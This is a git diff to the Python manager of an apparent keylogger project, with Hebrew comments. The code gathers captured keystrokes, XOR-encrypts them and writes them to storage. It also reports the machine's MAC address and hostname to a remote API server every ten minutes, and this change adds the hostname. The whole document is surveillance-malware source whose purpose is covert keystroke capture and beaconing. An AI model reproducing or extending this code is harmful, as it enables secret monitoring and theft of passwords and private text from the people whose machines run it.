@@ -2,6 +2,7 @@ import time
 import datetime
 import threading
 import uuid
+import socket
 from key_logger import KeyLogger
 from encryption import Encryption
 from api_server import RequestManager
@@ -30,8 +31,8 @@ class Manager:
                 if logged_keys:
                     timestamp = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")
                     data = {timestamp: logged_keys}
-                    encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list( data)
-                    self.write_keys.handle_write(self.storageLocation,encrypted_data)
+                    encrypted_data = self.encryption.xor_encrypt_decrypt_dict_list(data)
+                    self.write_keys.handle_write(self.storageLocation, encrypted_data)
 
                     self.keylogger.clear_buffer()
                     print("22222222")
@@ -47,10 +48,10 @@ class Manager:
 
     def server_status_update(self, connected):
         mac_address = ':'.join(f'{(uuid.getnode() >> i) & 0xff:02x}' for i in range(0, 48, 8))
-    
+        hostname = socket.gethostname()
         status = {
-            "macAddress": mac_address,
-            "name": "מחשב נייד של מוישי",
+            "mac_address": mac_address,
+            "name": hostname,
             "connected": connected,
             "timeLimit": self.timeLimit,
             "storageLocation": self.storageLocation,
@@ -61,7 +62,7 @@ class Manager:
     def report_status_loop(self):
         print("33333333")
         while self.keep_reporting:
-            new_status = RequestManager().handle_request(method='GET',request_type="status")
+            new_status = RequestManager().handle_request(method='GET', request_type="status")
             print("4444444")
             time.sleep(600)  # המתן 10 דקות לפני הדיווח הבא
 
@@ -78,7 +79,6 @@ class Manager:
         self.keep_reporting = True  # המשך לדווח לשרת
 
 
-
-if           __name__ == '__main__':
+if __name__ == '__main__':
     a = Manager(timeLimit=0, time_wright=30)
     a.start()
